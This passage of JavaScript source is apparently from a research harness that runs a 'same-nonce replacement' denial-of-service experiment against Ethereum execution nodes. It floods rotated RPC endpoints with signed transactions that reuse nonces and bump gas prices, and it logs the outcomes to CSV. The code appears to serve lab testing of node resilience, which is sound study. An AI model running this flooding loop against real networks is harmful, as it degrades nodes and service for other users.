// NONCE RECOVERY
// ============================================================

async function recoverAccountNonce(
    account,
    accountIndex
) {

    if (
        account.recoveringNonce
    ) {

        return false;
    }

    account.recoveringNonce =
        true;

    try {

        const oldNonce =
            account.nonce;

        const currentNonce =
            BigInt(
                await controlWeb3.eth
                    .getTransactionCount(
                        account.address,
                        "pending"
                    )
            );

        if (
            currentNonce >
            oldNonce
        ) {

            account.nonce =
                currentNonce;

            // New nonce starts new attack cycle.
            account.submissionCount =
                0;

            account.nonceCycle++;

            nonceRecoveries++;

            console.log(
                "\n============================================================"
            );

            console.log(
                "[NONCE ADVANCED]"
            );

            console.log(
                `Account    : ${accountIndex + 1}`
            );

            console.log(
                `Address    : ${account.address}`
            );

            console.log(
                `Old nonce  : ${oldNonce}`
            );

            console.log(
                `New nonce  : ${currentNonce}`
            );

            console.log(
                `Cycle      : ${account.nonceCycle}`
            );

            console.log(
                "============================================================\n"
            );

            return true;
        }

        console.log(
            `[NONCE CHECK] ` +
            `account=${accountIndex + 1} ` +
            `old=${oldNonce} ` +
            `network=${currentNonce}`
        );

        return false;

    } catch (error) {

        console.error(
            `[NONCE RECOVERY ERROR] ` +
            `account=${accountIndex + 1} ` +
            `${getErrorMessage(error)}`
        );

        return false;

    } finally {

        account.recoveringNonce =
            false;
    }
}

// ============================================================
// SEND RAW TRANSACTION
// ============================================================

// async function sendRawTransaction(
//     web3,
//     rawTransaction
// ) {

//     // Using raw JSON-RPC request avoids depending on
//     // receipt handling for the attack loop.
//     //
//     // We only need eth_sendRawTransaction acceptance/hash.

//     return await web3.request({

//         method:
//             "eth_sendRawTransaction",

//         params:
//             [
//                 rawTransaction
//             ]
//     });
// }
async function sendRawTransaction(
    web3,
    rawTransaction
) {
    return new Promise((resolve, reject) => {

        let finished = false;

        const finishSuccess = (hash) => {
            if (finished) {
                return;
            }

            finished = true;
            resolve(hash);
        };

        const finishError = (error) => {
            if (finished) {
                return;
            }

            finished = true;
            reject(error);
        };

        try {
            const promiEvent =
                web3.eth.sendSignedTransaction(
                    rawTransaction
                );

            // We only need acceptance/hash.
            // Do not wait for transaction receipt.
            promiEvent.once(
                "transactionHash",
                hash => {
                    finishSuccess(hash);
                }
            );

            promiEvent.once(
                "error",
                error => {
                    finishError(error);
                }
            );

            // Prevent an unhandled rejection from the
            // underlying PromiEvent promise.
            if (
                promiEvent &&
                typeof promiEvent.catch === "function"
            ) {
                promiEvent.catch(
                    error => {
                        finishError(error);
                    }
                );
            }

        } catch (error) {
            finishError(error);
        }
    });
}


// ============================================================
// SUBMIT ONE ATTACK TRANSACTION
// ============================================================

async function submitTransaction(
    sequence,
    account,
    accountIndex,
    nodeIndex,
    chainId,
    encodedCall,
    baseGasPriceWei,
    experimentStart
) {

    const web3 =
        nodeWeb3[
            nodeIndex
        ];

    const rpcURL =
        RPC_URLS[
            nodeIndex
        ];

    const elNode =
        `el-${String(
            nodeIndex + 1
        ).padStart(2, "0")}-geth-lighthouse`;

    // --------------------------------------------------------
    // Snapshot account state.
    // --------------------------------------------------------

    const nonce =
        account.nonce;

    const nonceCycle =
        account.nonceCycle;

    const replacementNumber =
        account.submissionCount;

    const submissionNumber =
        replacementNumber + 1;

    const transactionType =
        replacementNumber === 0
            ? "INITIAL"
            : "REPLACEMENT";

    const gasPriceWei =
        calculateReplacementGasPrice(
            baseGasPriceWei,
            replacementNumber
        );

    const scheduledTimestamp =
        nowISO();

    const transaction = {

        from:
            account.address,

        to:
            CONTRACT_ADDRESS,

        value:
            "0",

        gas:
            CONTRACT_GAS_LIMIT.toString(),

        gasPrice:
            gasPriceWei.toString(),

        nonce:
            nonce.toString(),

        chainId:
            Number(chainId),

        data:
            encodedCall
    };

    // Count this scheduled submission in the current
    // replacement chain.
    account.submissionCount++;

    try {

        // ====================================================
        // SIGN
        // ====================================================

        const signed =
            await web3.eth.accounts
                .signTransaction(
                    transaction,
                    account.privateKey
                );

        if (
            !signed.rawTransaction
        ) {

            throw new Error(
                "Signing returned no raw transaction."
            );
        }

        // ====================================================
        // SEND
        // ====================================================

        const hash =
            await sendRawTransaction(
                web3,
                signed.rawTransaction
            );

        rpcAccepted++;

        appendResult({

            sequence:
                sequence + 1,

            scheduledTimestamp,

            responseTimestamp:
                nowISO(),

            elapsedMs:
                Date.now() -
                experimentStart,

            accountIndex:
                accountIndex + 1,

            address:
                account.address,

            nonce:
                nonce.toString(),

            nonceCycle,

            submissionNumber,

            replacementNumber,

            transactionType,

            elNode,

            rpcURL,

            complexity:
                COMPLEXITY,

            gasPriceWei:
                gasPriceWei.toString(),

            hash,

            status:
                "ACCEPTED",

            error:
                ""
        });

        console.log(
            `[${transactionType}] ` +
            `seq=${sequence + 1} ` +
            `account=${accountIndex + 1} ` +
            `nonce=${nonce} ` +
            `cycle=${nonceCycle} ` +
            `replacement=${replacementNumber} ` +
            `node=${elNode} ` +
            `gas=${gasPriceWei} ` +
            `hash=${hash}`
        );

    } catch (error) {

        const message =
            getErrorMessage(
                error
            );

        // ====================================================
        // NONCE TOO LOW
        // ====================================================

        if (
            isNonceTooLow(error)
        ) {

            rpcErrors++;

            appendResult({

                sequence:
                    sequence + 1,

                scheduledTimestamp,

                responseTimestamp:
                    nowISO(),

                elapsedMs:
                    Date.now() -
                    experimentStart,

                accountIndex:
                    accountIndex + 1,

                address:
                    account.address,

                nonce:
                    nonce.toString(),

                nonceCycle,

                submissionNumber,

                replacementNumber,

                transactionType,

                elNode,

                rpcURL,

                complexity:
                    COMPLEXITY,

                gasPriceWei:
                    gasPriceWei.toString(),

                hash:
                    "",

                status:
                    "NONCE_TOO_LOW",

                error:
                    message
            });

            console.error(
                `[NONCE TOO LOW] ` +
                `account=${accountIndex + 1} ` +
                `nonce=${nonce} ` +
                `${message}`
            );

            // Recover without terminating experiment.
            await recoverAccountNonce(
                account,
                accountIndex
            );

            return;
        }

        // ====================================================
        // OTHER RPC ERROR
        // ====================================================

        rpcErrors++;

        appendResult({

            sequence:
                sequence + 1,

            scheduledTimestamp,

            responseTimestamp:
                nowISO(),

            elapsedMs:
                Date.now() -
                experimentStart,

            accountIndex:
                accountIndex + 1,

            address:
                account.address,

            nonce:
                nonce.toString(),

            nonceCycle,

            submissionNumber,

            replacementNumber,

            transactionType,

            elNode,

            rpcURL,

            complexity:
                COMPLEXITY,

            gasPriceWei:
                gasPriceWei.toString(),

            hash:
                "",

            status:
                "RPC_ERROR",

            error:
                message
        });

        console.error(
            `[RPC ERROR] ` +
            `seq=${sequence + 1} ` +
            `account=${accountIndex + 1} ` +
            `nonce=${nonce} ` +
            `node=${elNode} ` +
            `${message}`
        );
    }
}

// ============================================================
// RUN ATTACK
// ============================================================

async function runExperiment(
    accounts,
    chainId,
    encodedCall,
    baseGasPriceWei
) {

    const expectedSubmissions =
        Math.floor(
            TX_PER_SECOND *
            TEST_DURATION_SECONDS
        );

    console.log(
        "\n============================================================"
    );

    console.log(
        "ATTACK-ONLY SAME-NONCE REPLACEMENT EXPERIMENT"
    );

    console.log(
        "============================================================"
    );

    console.log(
        `Existing accounts       : ${accounts.length}`
    );

    console.log(
        `Target tx/sec           : ${TX_PER_SECOND}`
    );

    console.log(
        `Global gap              : ${TX_INTERVAL_MS} ms`
    );

    console.log(
        `Duration                : ${TEST_DURATION_SECONDS} sec`
    );

    console.log(
        `Expected submissions    : ${expectedSubmissions}`
    );

    console.log(
        `EL nodes                : ${RPC_URLS.length}`
    );

    console.log(
        `Base gas                : ${BASE_GAS_PRICE_GWEI} gwei`
    );

    console.log(
        `Replacement bump        : ${REPLACEMENT_BUMP_PERCENT}%`
    );

    console.log(
        `Workload                : DoS(${COMPLEXITY})`
    );

    console.log(
        "Nonce policy            : replace → mined → next nonce → replace"
    );

    console.log(
        "============================================================\n"
    );

    const startTime =
        Date.now();

    const endTime =
        startTime +
        TEST_DURATION_MS;

    let sequence =
        0;

    while (
        sequence <
        expectedSubmissions
    ) {

        // ----------------------------------------------------
        // Absolute scheduling.
        // ----------------------------------------------------

        const targetTime =
            startTime +
            (
                sequence *
                TX_INTERVAL_MS
            );

        const delay =
            targetTime -
            Date.now();

        if (
            delay > 0
        ) {

            await sleep(
                delay
            );
        }

        if (
            Date.now() >=
            endTime
        ) {

            break;
        }

        // ----------------------------------------------------
        // Account rotation.
        // ----------------------------------------------------

        const accountIndex =
            sequence %
            accounts.length;

        const account =
            accounts[
                accountIndex
            ];

        // ----------------------------------------------------
        // Node rotation.
        // ----------------------------------------------------

        const nodeIndex =
            sequence %
            nodeWeb3.length;

        scheduledAttempts++;

        // ----------------------------------------------------
        // DO NOT await.
        //
        // Keeps scheduler independent of RPC latency.
        // ----------------------------------------------------

        const operation =
            submitTransaction(

                sequence,

                account,

                accountIndex,

                nodeIndex,

                chainId,

                encodedCall,

                baseGasPriceWei,

                startTime
            );

        outstanding.add(
            operation
        );

        operation

            .catch(
                error => {

                    console.error(
                        "[UNEXPECTED ERROR]",
                        getErrorMessage(
                            error
                        )
                    );
                }
            )

            .finally(
                () => {

                    outstanding.delete(
                        operation
                    );
                }
            );

        sequence++;

        // ----------------------------------------------------
        // Progress
        // ----------------------------------------------------

        if (
            sequence % 1000 === 0
        ) {

            const elapsed =
                (
                    Date.now() -
                    startTime
                ) /
                1000;

            console.log(
                "\n------------------------------------------------------------"
            );

            console.log(
                `Scheduled        : ${sequence}`
            );

            console.log(
                `Elapsed          : ${elapsed.toFixed(2)} sec`
            );

            console.log(
                `Scheduler rate   : ${(sequence / elapsed).toFixed(2)} tx/sec`
            );

            console.log(
                `RPC accepted     : ${rpcAccepted}`
            );

            console.log(
                `RPC errors       : ${rpcErrors}`
            );

            console.log(
                `Nonce recoveries : ${nonceRecoveries}`
            );

            console.log(
                `Outstanding      : ${outstanding.size}`
            );

            console.log(
                "------------------------------------------------------------\n"
            );
        }
    }

    // ========================================================
    // DRAIN
    // ========================================================

    console.log(
        "\nScheduling finished."
    );

    const drainDeadline =
        Date.now() +
        30000;

    while (
        outstanding.size > 0 &&
        Date.now() < drainDeadline
    ) {

        console.log(
            `Waiting for ${outstanding.size} outstanding RPC calls...`
        );

        await sleep(
            1000
        );
    }

    const elapsed =
        (
            Date.now() -
            startTime
        ) /
        1000;

    console.log(
        "\n============================================================"
    );

    console.log(
        "FINAL RESULTS"
    );

    console.log(
        "============================================================"
    );

    console.log(
        `Scheduled attempts : ${scheduledAttempts}`
    );

    console.log(
        `RPC accepted       : ${rpcAccepted}`
    );

    console.log(
        `RPC errors         : ${rpcErrors}`
    );

    console.log(
        `Nonce recoveries   : ${nonceRecoveries}`
    );

    console.log(
        `Outstanding        : ${outstanding.size}`
    );

    console.log(
        `Elapsed            : ${elapsed.toFixed(2)} sec`
    );

    console.log(
        `CSV                : ${RESULTS_FILE}`
    );

    console.log(
        "============================================================"
    );
}

